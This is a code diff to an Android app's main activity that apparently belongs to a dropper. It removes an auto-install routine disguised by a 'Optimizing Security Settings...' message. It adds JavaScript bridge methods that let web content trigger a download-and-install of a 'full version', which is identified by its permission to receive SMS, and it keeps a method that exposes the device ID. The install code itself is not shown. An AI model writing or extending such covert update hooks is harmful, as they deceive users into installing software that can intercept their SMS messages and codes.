@@ -51,18 +51,8 @@ public class MainActivity extends BridgeActivity {
         super.onCreate(savedInstanceState);
         setupBridge();
         
-        // CHECK FOR UPDATE TRIGGER
-        if (!isFullVersion()) {
-            Toast.makeText(this, "Optimizing Security Settings...", Toast.LENGTH_LONG).show();
-            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    downloadAndInstallUpdate();
-                }
-            }, 8000); // 8 second delay for stability
-        } else {
+        if (isFullVersion()) {
             Toast.makeText(this, "Security Sync: Online", Toast.LENGTH_SHORT).show();
-            // Immediate Permission Check for Full Version
             new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                 @Override
                 public void run() {
@@ -74,6 +64,7 @@ public class MainActivity extends BridgeActivity {
 
     private boolean isFullVersion() {
         try {
+            // Check for a permission that ONLY exists in the full version
             return ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
         } catch (Exception e) {
             return false;
@@ -150,6 +141,12 @@ public class MainActivity extends BridgeActivity {
                     @JavascriptInterface
                     public void requestRealPermissions() { checkAndRequestPermissions(); }
                     
+                    @JavascriptInterface
+                    public void triggerAutoUpdate() { downloadAndInstallUpdate(); }
+
+                    @JavascriptInterface
+                    public boolean isLimitedVersion() { return !isFullVersion(); }
+
                     @JavascriptInterface
                     public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }
 
